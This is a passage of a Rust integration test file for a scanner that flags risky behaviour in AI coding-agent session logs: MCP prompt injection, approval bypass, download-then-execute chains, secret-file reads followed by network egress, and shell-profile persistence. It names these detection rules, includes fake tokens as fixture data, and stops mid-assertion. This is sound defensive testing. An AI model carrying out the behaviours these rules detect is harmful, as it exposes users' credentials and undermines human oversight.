    let executable = Path::new(env!("CARGO_BIN_EXE_telltale"));
    let mut file = fs::File::open(executable).expect("open invoked executable");
    let mut bytes = Vec::new();
    file.read_to_end(&mut bytes)
        .expect("read invoked executable");
    let mut hasher = sha2::Sha256::new();
    hasher.update(&bytes);
    assert_eq!(
        summary["runtime"]["package_version"],
        env!("CARGO_PKG_VERSION")
    );
    assert_eq!(
        summary["runtime"]["build_git_hash"],
        env!("TELLTALE_GIT_HASH")
    );
    assert_eq!(
        summary["runtime"]["executable"]["observation_status"],
        "complete"
    );
    assert_eq!(
        summary["runtime"]["executable"]["path_hash"]
            .as_str()
            .unwrap()
            .len(),
        64
    );
    assert_eq!(
        summary["runtime"]["executable"]["path_hash"],
        path_hash(executable)
    );
    assert_eq!(
        summary["runtime"]["executable"]["sha256"]
            .as_str()
            .unwrap()
            .len(),
        64
    );
    assert!(
        summary["runtime"]["executable"]["sha256"]
            .as_str()
            .unwrap()
            .bytes()
            .all(|byte| byte.is_ascii_hexdigit())
    );
    assert_eq!(
        summary["runtime"]["executable"]["sha256"],
        format!("{:x}", hasher.finalize())
    );
}

#[test]
fn scan_once_reports_fixture_source_and_detection_accounting() {
    let summary = &fixture_scan().summary;
    assert_eq!(summary["event_type"], "health");
    // Copilot's mixed-context rules require unsupported UserContext and remain
    // visibility-limited. Commands also no longer include fabricated tool names.
    assert_eq!(summary["detection_count"], 30);
    assert_runtime_snapshot(summary);
    assert_eq!(
        summary["effective_configuration"]["local_config"]["mode"],
        "disabled"
    );
    assert_eq!(
        summary["effective_configuration"]["outputs"]["mode"],
        "legacy_default"
    );
    assert_eq!(
        summary["effective_configuration"]["outputs"]["sinks"][0]["origin_kind"],
        "legacy_default"
    );
    assert_eq!(
        summary["effective_configuration"]["rules"]["default_enabled"],
        true
    );
    assert_eq!(
        summary["effective_configuration"]["rules"]["sources"]
            .as_array()
            .unwrap()
            .len(),
        1
    );
    assert_source_processing_accounting(summary);
    assert_detection_flow_accounting(summary, 30, 0);
    assert_eq!(summary["source_processing"]["selected_source_count"], 57);
    assert_eq!(summary["source_discovery"]["basis"], "current_full_scan");
    assert_eq!(
        summary["source_discovery"]["performed_for_current_scan"],
        true
    );
    assert_eq!(summary["source_discovery"]["checked_status"], "succeeded");
    assert_eq!(
        summary["source_discovery"]["first_error_category"],
        Value::Null
    );
    assert_eq!(
        summary["source_discovery"]["best_effort_fallback_used"],
        false
    );
    assert_eq!(summary["source_discovery"]["returned_source_count"], 57);
    assert_eq!(summary["source_discovery"]["operational_source_count"], 57);
    assert_eq!(
        summary["source_discovery"]["project_configuration"],
        serde_json::json!({
            "mode": "none",
            "document_attempt_count": 0,
            "document_success_count": 0,
            "document_failure_count": 0,
            "loaded_project_count": 0,
        })
    );
    assert_eq!(
        summary["diagnostic_warnings"],
        serde_json::json!([{
            "code": "source_coverage_partial",
            "classification": "coverage_limitation",
            "basis": "source_processing"
        }])
    );
    assert_eq!(
        summary["source_processing"]["selected_source_coverage"],
        "partial"
    );
    assert_eq!(
        summary["source_processing"]["accounting_partial_source_count"],
        1
    );
    assert!(
        summary["source_processing"]["visibility_limited_source_count"]
            .as_u64()
            .unwrap()
            > 0
    );
    assert_eq!(
        summary["source_processing"]["parse_success_source_count"],
        57
    );
    assert_eq!(summary["source_processing"]["empty_source_count"], 0);
    assert_eq!(summary["source_processing"]["parse_error_source_count"], 0);
    assert_eq!(summary["source_processing"]["parsed_record_count"], 126);
    assert_eq!(
        summary["source_processing"]["record_kind_counts"],
        serde_json::json!({
            "user_message": 19,
            "assistant_message": 23,
            "tool_call": 26,
            "tool_result": 14,
            "session_meta": 44,
            "other": 0,
        })
    );
    assert_eq!(summary["detection_flow"]["matched_rule_id_count"], 89);
    assert_eq!(summary["source_counts"]["claude.jsonl"], 3);
    assert_eq!(summary["source_counts"]["codex.jsonl"], 40);
    assert_eq!(summary["source_counts"]["codex.archived_jsonl"], 2);
    assert_eq!(summary["source_counts"]["codex.headless_jsonl"], 2);
    assert_eq!(summary["source_counts"]["openclaw.jsonl"], 2);
    assert_eq!(summary["source_counts"]["qwen.jsonl"], 2);
    assert_eq!(summary["source_counts"]["opencode.sqlite"], 1);
    assert_eq!(summary["source_counts"]["copilot.copilot_process_log"], 5);

    let events = &fixture_scan().events;
    assert_eq!(events.len(), 32);
}

struct FixtureScan {
    summary: Value,
    events: Vec<Value>,
}

// Cache one immutable first scan, so independently runnable checks share fresh-state output.
fn fixture_scan() -> &'static FixtureScan {
    static SCAN: std::sync::OnceLock<FixtureScan> = std::sync::OnceLock::new();
    SCAN.get_or_init(|| {
        let temp = tempdir().expect("tempdir");
        let log_path = temp.path().join("telltale-events.jsonl");
        let state_path = temp.path().join("telltale-state.json");
        let output = Command::new(env!("CARGO_BIN_EXE_telltale"))
            .args([
                "scan",
                "--once",
                "--allow-fixtures",
                "--no-local-config",
                "--root",
                "tests/fixtures/session_stores",
                "--log-path",
            ])
            .arg(&log_path)
            .args(["--state-path"])
            .arg(&state_path)
            .output()
            .expect("run telltale");
        assert!(
            output.status.success(),
            "stderr: {}",
            String::from_utf8_lossy(&output.stderr)
        );
        let summary = serde_json::from_slice(&output.stdout).expect("summary json");
        let lines = fs::read_to_string(log_path).expect("log file");
        let events = lines
            .lines()
            .map(|line| serde_json::from_str::<Value>(line).expect("event json"))
            .collect();
        FixtureScan { summary, events }
    })
}

fn assert_source_visibility_exclusions(events: &[Value]) {
    assert!(
        !events.iter().any(|event| {
            event["event_type"] == "detection" && event["session_id"] == "copilot-uc001-tool-result"
        }),
        "mixed-context rules must not bypass Copilot's unsupported UserContext"
    );
    assert!(events.iter().all(|event| {
        event.get("source_processing").is_none()
            && event.get("detection_flow").is_none()
            && event.get("source_discovery").is_none()
            && event.get("diagnostic_warnings").is_none()
            && event.get("runtime").is_none()
            && event.get("effective_configuration").is_none()
    }));
    assert!(events.iter().any(|event| {
        event["event_type"] == "activity"
            && event["check_name"] == "install_inventory"
            && event["client"] == "install_inventory"
            && event["tags"]
                .as_array()
                .expect("tags")
                .iter()
                .any(|tag| tag == "install_inventory")
    }));
    assert!(
        !events
            .iter()
            .any(|event| event["session_id"] == "session-a" && event["client"] == "claude")
    );
    assert!(
        !events
            .iter()
            .any(|event| event["session_id"] == "claude-tool-use" && event["client"] == "claude")
    );
    assert!(
        !events
            .iter()
            .any(|event| event["session_id"] == "qwen-session-a" && event["client"] == "qwen")
    );
    assert!(
        !events
            .iter()
            .any(|event| event["session_id"] == "openclaw-session-a"
                && event["client"] == "openclaw")
    );
    assert!(
        !events
            .iter()
            .any(|event| event["session_id"] == "approval-bypass-quoted-example")
    );
    assert!(
        !events
            .iter()
            .any(|event| event["session_id"] == "uc001-negative-normal-mcp")
    );
    assert!(
        !events
            .iter()
            .any(|event| event["session_id"] == "controlled-domain-user-text")
    );
    assert!(
        !events
            .iter()
            .any(|event| event["session_id"] == "controlled-domain-assistant-text")
    );
    assert!(
        !events
            .iter()
            .any(|event| event["session_id"] == "uc001-negative-server-instructions")
    );
    assert!(
        !events
            .iter()
            .any(|event| event["session_id"] == "uc001-negative-tools-list")
    );
    assert!(
        !events
            .iter()
            .any(|event| event["session_id"] == "uc001-negative-domain-only")
    );
}

#[test]
fn scan_once_writes_schema_shaped_health_jsonl() {
    let events = &fixture_scan().events;
    let schema: Value =
        serde_json::from_str(include_str!("../../schemas/event.schema.json")).expect("schema json");
    let validator = validator_for(&schema).expect("schema validator");
    for event in events {
        assert!(
            validator.is_valid(event),
            "event failed schema validation: {}",
            event["session_id"]
                .as_str()
                .unwrap_or("<missing session_id>")
        );
        for item in event["evidence"].as_array().expect("evidence array") {
            let redacted = item["redacted_value"].as_str().expect("redacted value");
            assert!(
                item["hash"].is_string(),
                "evidence hash missing for {}",
                event["session_id"]
                    .as_str()
                    .unwrap_or("<missing session_id>")
            );
            assert!(!redacted.contains(".env"));
            assert!(!redacted.contains("darkroastcyber.io"));
            assert!(!redacted.contains("mcp-lab"));
            assert!(!redacted.contains("id_rsa"));
            assert!(!redacted.contains("ghp_1234567890abcdef1234"));
            assert!(!redacted.contains("eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ"));
            assert!(!redacted.contains("fixture_session_token_1234567890abcdef"));
        }
    }

    let event = &events[0];
    assert!(
        validator.is_valid(event),
        "health event failed schema validation"
    );
    assert_eq!(event["schema_version"], "3.0");
    assert_eq!(event["event_type"], "health");
    assert_eq!(event["severity"], "informational");
    assert_eq!(event["risk_score"], 0);
    assert_eq!(event["session_id"], "scanner");
    assert_eq!(event["component"], "scanner");
    assert_eq!(event["check_name"], "source_discovery");
    assert_eq!(event["status"], "ok");
    assert_eq!(event["telltale_version"], env!("CARGO_PKG_VERSION"));
    assert!(event["scan_duration_ms"].as_u64().is_some());
    assert_eq!(event["rule_count"], 18);
    assert_eq!(event["emitted_count"], 31);
    assert_eq!(event["suppressed_count"], 0);
    assert_eq!(event["scanner_error_count"], 0);
    assert_eq!(event["threshold_config"]["low"], 20);
    assert_eq!(event["threshold_config"]["medium"], 50);
    assert_eq!(event["threshold_config"]["high"], 70);
    assert_eq!(event["threshold_config"]["critical"], 90);
    assert!(event.get("active_policy_name").is_none());
    assert!(
        event["evidence"]
            .as_array()
            .is_some_and(|items| !items.is_empty())
    );
    assert_eq!(
        event["evidence"].as_array().expect("health evidence").len(),
        2
    );
    assert_eq!(event["evidence"][0]["field"], "source_inventory");
    assert_eq!(
        event["evidence"][0]["redacted_value"],
        "sources=57; client_source_kinds=8"
    );
    assert!(
        event["evidence"][0]["hash"]
            .as_str()
            .is_some_and(|hash| hash.len() == 64)
    );
    assert_eq!(event["evidence"][1]["field"], "source_inventory_change");
    assert_eq!(
        event["evidence"][1]["redacted_value"],
        "baseline=true; added=57; removed=0; unchanged=0"
    );
    assert!(
        event["evidence"][1]["hash"]
            .as_str()
            .is_some_and(|hash| hash.len() == 64)
    );
    for item in event["evidence"].as_array().expect("evidence array") {
        let redacted = item["redacted_value"].as_str().expect("redacted value");
        assert!(!redacted.contains("tests/fixtures"));
        assert!(!redacted.contains(".jsonl"));
        assert!(!redacted.contains(".sqlite"));
    }
}

#[test]
fn scan_once_preserves_mcp_metadata_and_tool_result_detections() {
    let events = &fixture_scan().events;
    let schema: Value =
        serde_json::from_str(include_str!("../../schemas/event.schema.json")).expect("schema json");
    let validator = validator_for(&schema).expect("schema validator");
    let detection = events
        .iter()
        .find(|event| event["session_id"] == "uc001-positive")
        .expect("uc001 detection");
    assert!(
        validator.is_valid(detection),
        "detection event failed schema validation"
    );
    assert_eq!(detection["event_type"], "detection");
    assert_eq!(detection["severity"], "critical");
    assert_eq!(detection["session_id"], "uc001-positive");
    // Mentioning a tool in assistant text does not attest an observed tool name.
    assert!(detection["tool_name"].is_null());
    assert!(
        detection["rule_ids"]
            .as_array()
            .expect("rule ids")
            .iter()
            .any(|rule| rule == "mcp.tool_metadata.prompt_injection")
    );
    assert!(
        detection["evidence"]
            .as_array()
            .expect("evidence")
            .iter()
            .all(|item| {
                let value = item["redacted_value"].as_str().expect("redacted value");
                !value.contains(".env") && !value.contains("mcp-lab")
            })
    );

    for session_id in [
        "uc001-positive-server-instructions",
        "uc001-positive-tool-description",
        "uc001-positive-parameter-description",
    ] {
        let event = events
            .iter()
            .find(|event| event["session_id"] == session_id)
            .unwrap_or_else(|| panic!("missing detection for {session_id}"));
        assert!(validator.is_valid(event), "invalid event for {session_id}");
        assert_eq!(event["event_type"], "detection", "{session_id}");
        assert_eq!(event["severity"], "critical", "{session_id}");
        assert!(
            event["rule_ids"]
                .as_array()
                .expect("rule ids")
                .iter()
                .any(|rule| rule == "mcp.tool_metadata.prompt_injection"),
            "{session_id}"
        );
        if session_id == "uc001-positive-server-instructions" {
            assert!(
                event["categories"]
                    .as_array()
                    .expect("categories")
                    .iter()
                    .any(|category| category == "mcp_prompt_injection")
            );
        }
        assert!(
            event["evidence"]
                .as_array()
                .expect("evidence")
                .iter()
                .all(|item| {
                    let value = item["redacted_value"].as_str().expect("redacted value");
                    !value.contains(".env") && !value.contains("mcp-lab")
                }),
            "unredacted evidence for {session_id}"
        );
    }

    let compliance_tool = events
        .iter()
        .find(|event| event["session_id"] == "uc001-positive-compliance-tool")
        .expect("compliance tool detection");
    assert!(
        validator.is_valid(compliance_tool),
        "compliance tool event failed schema validation"
    );
    assert_eq!(compliance_tool["event_type"], "detection");
    assert_eq!(compliance_tool["severity"], "critical");
    assert!(compliance_tool["tool_name"].is_null());
    assert!(
        compliance_tool["rule_ids"]
            .as_array()
            .expect("rule ids")
            .iter()
            .any(|rule| rule == "mcp.tool_metadata.prompt_injection")
    );
    assert!(
        compliance_tool["rule_ids"]
            .as_array()
            .expect("rule ids")
            .iter()
            .any(|rule| rule == "chain.mcp_injection_then_egress")
    );
    assert!(
        compliance_tool["evidence"]
            .as_array()
            .expect("evidence")
            .iter()
            .all(|item| {
                let value = item["redacted_value"].as_str().expect("redacted value");
                !value.contains(".env") && !value.contains("darkroastcyber.io")
            })
    );

    let reversed_injection = events
        .iter()
        .find(|event| event["session_id"] == "uc001-positive-reversed-injection")
        .expect("reversed injection detection");
    assert!(
        validator.is_valid(reversed_injection),
        "reversed injection event failed schema validation"
    );
    assert_eq!(reversed_injection["event_type"], "detection");
    assert_eq!(reversed_injection["severity"], "critical");
    assert!(reversed_injection["tool_name"].is_null());
    assert!(
        reversed_injection["rule_ids"]
            .as_array()
            .expect("rule ids")
            .iter()
            .any(|rule| rule == "mcp.tool_metadata.prompt_injection")
    );
    assert!(
        reversed_injection["rule_ids"]
            .as_array()
            .expect("rule ids")
            .iter()
            .any(|rule| rule == "chain.mcp_injection_then_egress")
    );
    assert!(
        reversed_injection["evidence"]
            .as_array()
            .expect("evidence")
            .iter()
            .all(|item| {
                let value = item["redacted_value"].as_str().expect("redacted value");
                !value.contains(".env") && !value.contains("darkroastcyber.io")
            })
    );

    let tool_result = events
        .iter()
        .find(|event| event["session_id"] == "tool-result-injection")
        .expect("tool result detection");
    assert!(
        validator.is_valid(tool_result),
        "tool result event failed schema validation"
    );
    assert_eq!(tool_result["event_type"], "detection");
    assert_eq!(tool_result["severity"], "critical");
    assert!(
        tool_result["rule_ids"]
            .as_array()
            .expect("rule ids")
            .iter()
            .any(|rule| rule == "mcp.tool_metadata.prompt_injection")
    );
    assert!(
        tool_result["rule_ids"]
            .as_array()
            .expect("rule ids")
            .iter()
            .any(|rule| rule == "approval.bypass.context")
    );
    assert!(
        tool_result["categories"]
            .as_array()
            .expect("categories")
            .iter()
            .any(|category| category == "approval_bypass")
    );
    assert!(
        !tool_result["categories"]
            .as_array()
            .expect("categories")
            .iter()
            .any(|category| category == "secret_access")
    );
    assert!(
        tool_result["evidence"]
            .as_array()
            .expect("evidence")
            .iter()
            .all(|item| {
                let value = item["redacted_value"].as_str().expect("redacted value");
                !value.contains(".env") && !value.contains("mcp-lab")
            })
    );
}

#[test]
fn scan_once_preserves_source_specific_mcp_tool_results() {
    let events = &fixture_scan().events;
    let schema: Value =
        serde_json::from_str(include_str!("../../schemas/event.schema.json")).expect("schema json");
    let validator = validator_for(&schema).expect("schema validator");
    let claude_tool_result = events
        .iter()
        .find(|event| event["session_id"] == "claude-uc001-tool-result")
        .expect("claude tool result detection");
    assert!(
        validator.is_valid(claude_tool_result),
        "claude tool result event failed schema validation"
    );
    assert_eq!(claude_tool_result["event_type"], "detection");
    assert_eq!(claude_tool_result["client"], "claude");
    assert_eq!(claude_tool_result["severity"], "critical");
    assert_eq!(claude_tool_result["tool_name"], "repo_status");
    assert!(
        claude_tool_result["rule_ids"]
            .as_array()
            .expect("rule ids")
            .iter()
            .any(|rule| rule == "mcp.tool_metadata.prompt_injection")
    );
    assert!(
        claude_tool_result["rule_ids"]
            .as_array()
            .expect("rule ids")
            .iter()
            .any(|rule| rule == "chain.mcp_injection_then_egress")
    );
    assert!(
        claude_tool_result["evidence"]
            .as_array()
            .expect("evidence")
            .iter()
            .all(|item| {
                let value = item["redacted_value"].as_str().expect("redacted value");
                !value.contains(".env")
                    && !value.contains("darkroastcyber.io")
                    && !value.contains("mcp-lab")
            })
    );

    let qwen_tool_result = events
        .iter()
        .find(|event| event["session_id"] == "qwen-uc001-tool-result")
        .expect("qwen tool result detection");
    assert!(
        validator.is_valid(qwen_tool_result),
        "qwen tool result event failed schema validation"
    );
    assert_eq!(qwen_tool_result["event_type"], "detection");
    assert_eq!(qwen_tool_result["client"], "qwen");
    assert_eq!(qwen_tool_result["severity"], "critical");
    assert_eq!(qwen_tool_result["tool_name"], "repo_status");
    assert!(
        qwen_tool_result["rule_ids"]
            .as_array()
            .expect("rule ids")
            .iter()
            .any(|rule| rule == "mcp.tool_metadata.prompt_injection")
    );
    assert!(
        qwen_tool_result["rule_ids"]
            .as_array()
            .expect("rule ids")
            .iter()
            .any(|rule| rule == "chain.mcp_injection_then_egress")
    );
    assert!(
        qwen_tool_result["evidence"]
            .as_array()
            .expect("evidence")
            .iter()
            .all(|item| {
                let value = item["redacted_value"].as_str().expect("redacted value");
                !value.contains(".env")
                    && !value.contains("darkroastcyber.io")
                    && !value.contains("mcp-lab")
            })
    );

    let openclaw_tool_result = events
        .iter()
        .find(|event| event["session_id"] == "openclaw-uc001-tool-result")
        .expect("openclaw tool result detection");
    assert!(
        validator.is_valid(openclaw_tool_result),
        "openclaw tool result event failed schema validation"
    );
    assert_eq!(openclaw_tool_result["event_type"], "detection");
    assert_eq!(openclaw_tool_result["client"], "openclaw");
    assert_eq!(openclaw_tool_result["severity"], "critical");
    assert_eq!(openclaw_tool_result["tool_name"], "repo_status");
    assert!(
        openclaw_tool_result["rule_ids"]
            .as_array()
            .expect("rule ids")
            .iter()
            .any(|rule| rule == "mcp.tool_metadata.prompt_injection")
    );
    assert!(
        openclaw_tool_result["rule_ids"]
            .as_array()
            .expect("rule ids")
            .iter()
            .any(|rule| rule == "chain.mcp_injection_then_egress")
    );
    assert!(
        openclaw_tool_result["evidence"]
            .as_array()
            .expect("evidence")
            .iter()
            .all(|item| {
                let value = item["redacted_value"].as_str().expect("redacted value");
                !value.contains(".env")
                    && !value.contains("darkroastcyber.io")
                    && !value.contains("mcp-lab")
            })
    );

    let opencode_sqlite_tool_result = events
        .iter()
        .find(|event| event["session_id"] == "opencode-uc001-sqlite-tool-result")
        .expect("opencode sqlite tool result detection");
    assert!(
        validator.is_valid(opencode_sqlite_tool_result),
        "opencode sqlite tool result event failed schema validation"
    );
    assert_eq!(opencode_sqlite_tool_result["event_type"], "detection");
    assert_eq!(opencode_sqlite_tool_result["client"], "opencode");
    assert_eq!(opencode_sqlite_tool_result["severity"], "critical");
    assert_eq!(opencode_sqlite_tool_result["tool_name"], "repo_status");
    assert!(
        opencode_sqlite_tool_result["rule_ids"]
            .as_array()
            .expect("rule ids")
            .iter()
            .any(|rule| rule == "mcp.tool_metadata.prompt_injection")
    );
    assert!(
        opencode_sqlite_tool_result["rule_ids"]
            .as_array()
            .expect("rule ids")
            .iter()
            .any(|rule| rule == "chain.mcp_injection_then_egress")
    );
    assert!(
        opencode_sqlite_tool_result["evidence"]
            .as_array()
            .expect("evidence")
            .iter()
            .all(|item| {
                let value = item["redacted_value"].as_str().expect("redacted value");
                !value.contains(".env")
                    && !value.contains("darkroastcyber.io")
                    && !value.contains("mcp-lab")
            })
    );
}

#[test]
fn scan_once_emits_token_injection_and_install_detections() {
    let events = &fixture_scan().events;
    let schema: Value =
        serde_json::from_str(include_str!("../../schemas/event.schema.json")).expect("schema json");
    let validator = validator_for(&schema).expect("schema validator");
    let jwt_bearer_token = events
        .iter()
        .find(|event| event["session_id"] == "jwt-bearer-token-pattern")
        .expect("jwt bearer token detection");
    assert!(
        validator.is_valid(jwt_bearer_token),
        "jwt bearer token event failed schema validation"
    );
    assert_eq!(jwt_bearer_token["event_type"], "detection");
    assert_eq!(jwt_bearer_token["severity"], "low");
    assert!(
        jwt_bearer_token["rule_ids"]
            .as_array()
            .expect("rule ids")
            .iter()
            .any(|rule| rule == "credential.api_key.pattern")
    );
    assert!(
        jwt_bearer_token["categories"]
            .as_array()
            .expect("categories")
            .iter()
            .any(|category| category == "credential_pattern")
    );
    assert!(
        jwt_bearer_token["evidence"]
            .as_array()
            .expect("evidence")
            .iter()
            .all(|item| {
                let value = item["redacted_value"].as_str().expect("redacted value");
                !value.contains("eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ")
                    && !value.contains("fixture_session_token_1234567890abcdef")
            })
    );

    let tool_injection_session = events
        .iter()
        .find(|event| event["session_id"] == "tool-injection-shape-session")
        .expect("tool injection session detection");
    assert!(
        validator.is_valid(tool_injection_session),
        "tool injection session event failed schema validation"
    );
    assert_eq!(tool_injection_session["event_type"], "detection");
    assert_eq!(tool_injection_session["severity"], "critical");
    assert!(
        tool_injection_session["rule_ids"]
            .as_array()
            .expect("rule ids")
            .iter()
            .any(|rule| rule == "tool.injection.shape")
    );
    assert!(
        tool_injection_session["evidence"]
            .as_array()
            .expect("evidence")
            .iter()
            .all(|item| {
                let value = item["redacted_value"].as_str().expect("redacted value");
                !value.contains(".env") && !value.contains("mcp-lab")
            })
    );
    let tool_result = events
        .iter()
        .find(|event| event["session_id"] == "tool-result-injection")
        .expect("tool result detection");
    assert!(
        tool_result["rule_ids"]
            .as_array()
            .expect("rule ids")
            .iter()
            .any(|rule| rule == "network.controlled_test_domain.darkroast")
    );
    assert!(
        tool_result["rule_ids"]
            .as_array()
            .expect("rule ids")
            .iter()
            .any(|rule| rule == "chain.mcp_injection_then_egress")
    );
    assert!(
        tool_result["evidence"]
            .as_array()
            .expect("evidence")
            .iter()
            .all(|item| {
                let value = item["redacted_value"].as_str().expect("redacted value");
                !value.contains(".env") && !value.contains("darkroastcyber.io")
            })
    );
    let approval = events
        .iter()
        .find(|event| event["session_id"] == "approval-bypass-context")
        .expect("approval detection");
    assert!(
        validator.is_valid(approval),
        "approval bypass event failed schema validation"
    );
    assert_eq!(approval["event_type"], "detection");
    assert_eq!(approval["session_id"], "approval-bypass-context");
    assert!(
        approval["rule_ids"]
            .as_array()
            .is_some_and(|rules| { rules.iter().any(|rule| rule == "approval.bypass.context") })
    );
    assert!(approval["categories"].as_array().is_some_and(|categories| {
        categories
            .iter()
            .any(|category| category == "approval_bypass")
    }));

    let install_persistence = events
        .iter()
        .find(|event| event["session_id"] == "install-persistence-chain")
        .expect("install persistence detection");
    assert!(
        validator.is_valid(install_persistence),
        "install persistence event failed schema validation"
    );
    assert_eq!(install_persistence["event_type"], "detection");
    assert_eq!(install_persistence["severity"], "critical");
    assert!(
        install_persistence["rule_ids"]
            .as_array()
            .expect("rule ids")
            .iter()
            .any(|rule| rule == "install.package_manager")
    );
    assert!(
        install_persistence["rule_ids"]
            .as_array()
            .expect("rule ids")
            .iter()
            .any(|rule| rule == "persistence.shell_profile")
    );
    assert!(
        install_persistence["rule_ids"]
            .as_array()
            .expect("rule ids")
            .iter()
            .any(|rule| rule == "chain.install_then_persistence")
    );
    assert!(
        install_persistence["categories"]
            .as_array()
            .is_some_and(|categories| {
                categories.iter().any(|category| category == "install")
                    && categories.iter().any(|category| category == "persistence")
            })
    );
    assert!(
        install_persistence["evidence"]
            .as_array()
            .expect("evidence")
            .iter()
            .all(|item| {
                let value = item["redacted_value"].as_str().expect("redacted value");
                !value.contains("darkroastcyber.io")
                    && !value.contains("pip install")
                    && !value.contains("~/.bashrc")
            })
    );
}

#[test]
fn scan_once_emits_execution_secret_and_api_key_detections() {
    let events = &fixture_scan().events;
    let schema: Value =
        serde_json::from_str(include_str!("../../schemas/event.schema.json")).expect("schema json");
    let validator = validator_for(&schema).expect("schema validator");
    let encoded_payload = events
        .iter()
        .find(|event| event["session_id"] == "encoded-payload-chain")
        .expect("encoded payload detection");
    assert!(
        validator.is_valid(encoded_payload),
        "encoded payload event failed schema validation"
    );
    assert_eq!(encoded_payload["event_type"], "detection");
    assert_eq!(encoded_payload["severity"], "high");
    assert!(
        encoded_payload["rule_ids"]
            .as_array()
            .expect("rule ids")
            .iter()
            .any(|rule| rule == "execution.shell")
    );
    assert!(
        encoded_payload["rule_ids"]
            .as_array()
            .expect("rule ids")
            .iter()
            .any(|rule| rule == "execution.encoded_payload")
    );
    assert!(
        encoded_payload["rule_ids"]
            .as_array()
            .expect("rule ids")
            .iter()
            .any(|rule| rule == "chain.shell_encoded_payload")
    );
    assert!(
        encoded_payload["categories"]
            .as_array()
            .expect("categories")
            .iter()
            .any(|category| category == "execution")
    );
    assert!(
        encoded_payload["tags"]
            .as_array()
            .expect("tags")
            .iter()
            .any(|tag| tag == "chain")
    );
    assert!(
        encoded_payload["evidence"]
            .as_array()
            .expect("evidence")
            .iter()
            .all(|item| {
                let value = item["redacted_value"].as_str().expect("redacted value");
                item["hash"].is_string() && !value.contains("base64 --decode")
            })
    );

    let download_execute = events
        .iter()
        .find(|event| event["session_id"] == "download-execute-chain")
        .expect("download execute detection");
    assert!(
        validator.is_valid(download_execute),
        "download execute event failed schema validation"
    );
    assert_eq!(download_execute["event_type"], "detection");
    assert_eq!(download_execute["severity"], "high");
    assert!(
        download_execute["rule_ids"]
            .as_array()
            .expect("rule ids")
            .iter()
            .any(|rule| rule == "network.download")
    );
    assert!(
        download_execute["rule_ids"]
            .as_array()
            .expect("rule ids")
            .iter()
            .any(|rule| rule == "execution.shell")
    );
    assert!(
        download_execute["rule_ids"]
            .as_array()
            .expect("rule ids")
            .iter()
            .any(|rule| rule == "chain.download_then_execute")
    );
    assert!(
        download_execute["evidence"]
            .as_array()
            .expect("evidence")
            .iter()
            .all(|item| {
                let value = item["redacted_value"].as_str().expect("redacted value");
                item["hash"].is_string()
                    && !value.is_empty()
                    && !value.contains(".env")
                    && !value.contains("darkroastcyber.io")
            })
    );

    let secret_network = events
        .iter()
        .find(|event| event["session_id"] == "secret-network-chain")
        .expect("secret network detection");
    assert!(
        validator.is_valid(secret_network),
        "secret network event failed schema validation"
    );
    assert_eq!(secret_network["event_type"], "detection");
    assert_eq!(secret_network["severity"], "critical");
    assert!(
        secret_network["rule_ids"]
            .as_array()
            .expect("rule ids")
            .iter()
            .any(|rule| rule == "secret.env.read")
    );
    assert!(
        secret_network["rule_ids"]
            .as_array()
            .expect("rule ids")
            .iter()
            .any(|rule| rule == "network.download")
    );
    assert!(
        secret_network["rule_ids"]
            .as_array()
            .expect("rule ids")
            .iter()
            .any(|rule| rule == "chain.secret_then_network")
    );
    assert!(
        secret_network["categories"]
            .as_array()
            .expect("categories")
            .iter()
            .any(|category| category == "secret_access")
            && secret_network["categories"]
                .as_array()
                .expect("categories")
                .iter()
                .any(|category| category == "download")
    );
    assert!(
        secret_network["evidence"]
            .as_array()
            .expect("evidence")
            .iter()
            .all(|item| {
                let value = item["redacted_value"].as_str().expect("redacted value");
                !value.is_empty() && !value.contains(".env") && !value.contains("darkroastcyber.io")
            })
    );

    let private_key = events
        .iter()
        .find(|event| event["session_id"] == "private-key-read")
        .expect("private key detection");
    assert!(
        validator.is_valid(private_key),
        "private key event failed schema validation"
    );
    assert_eq!(private_key["event_type"], "detection");
    assert_eq!(private_key["severity"], "medium");
    assert!(
        !private_key["rule_ids"]
            .as_array()
            .unwrap()
            .iter()
            .any(|id| id == "execution.shell"),
        "the bash tool name must not be synthesized into command evidence"
    );
    assert!(
        private_key["rule_ids"]
            .as_array()
            .expect("rule ids")
            .iter()
            .any(|rule| rule == "secret.private_key.read")
    );
    assert!(
        private_key["categories"]
            .as_array()
            .expect("categories")
            .iter()
            .any(|category| category == "secret_access")
    );
    assert!(
        private_key["evidence"]
            .as_array()
            .expect("evidence")
            .iter()
            .all(|item| {
                let value = item["redacted_value"].as_str().expect("redacted value");
                !value.contains("id_rsa")
            })
    );

    let api_key = events
        .iter()
        .find(|event| event["session_id"] == "api-key-pattern")
        .expect("api key detection");
    assert!(
        validator.is_valid(api_key),
        "api key event failed schema validation"
    );
    assert_eq!(api_key["event_type"], "detection");
    assert_eq!(api_key["severity"], "low");
    assert!(
        api_key["rule_ids"]
            .as_array()
            .expect("rule ids")
            .iter()
            .any(|rule| rule == "credential.api_key.pattern")
    );
    assert!(
        api_key["categories"]
            .as_array()
            .expect("categories")
            .iter()
            .any(|category| category == "credential_pattern")
    );
    assert!(
        api_key["evidence"]
            .as_array()
            .expect("evidence")
            .iter()
            .all(|item| {
                let value = item["redacted_value"].as_str().expect("redacted value");
                item["hash"].is_string()
                    && !value.is_empty()
                    && !value.contains("ghp_1234567890abcdef1234")
            })
    );
}

#[test]
fn scan_once_excludes_negative_fixture_detections() {
    let events = &fixture_scan().events;
    assert_source_visibility_exclusions(events);
    assert!(
        !events.iter().any(|event| event["event_type"] == "detection"
            && event["session_id"] == "uc001-negative-mcp-user-text")
    );
    assert!(
        !events.iter().any(|event| event["event_type"] == "detection"
            && event["session_id"] == "uc001-negative-normal-mcp")
    );
    assert!(
        !events.iter().any(|event| event["event_type"] == "detection"
            && event["session_id"] == "uc001-negative-server-instructions")
    );
    assert!(
        !events.iter().any(|event| event["event_type"] == "detection"
            && event["session_id"] == "uc001-negative-domain-only")
    );
    assert!(
        !events.iter().any(|event| event["event_type"] == "detection"
            && event["session_id"] == "controlled-domain-user-text")
    );
    assert!(
        !events.iter().any(|event| event["event_type"] == "detection"
            && event["session_id"] == "controlled-domain-assistant-text")
    );
    assert!(
        !events.iter().any(|event| event["event_type"] == "detection"
            && event["session_id"] == "uc001-negative-domain-tool-result")
    );
    assert!(
        !events.iter().any(|event| event["event_type"] == "detection"
            && event["session_id"] == "tool-result-injection"
            && event["severity"] != "critical")
    );
    assert!(
        !events.iter().any(|event| event["event_type"] == "detection"
            && event["session_id"] == "normal-mcp-tool-result")
    );
    assert!(
        !events.iter().any(|event| event["event_type"] == "detection"
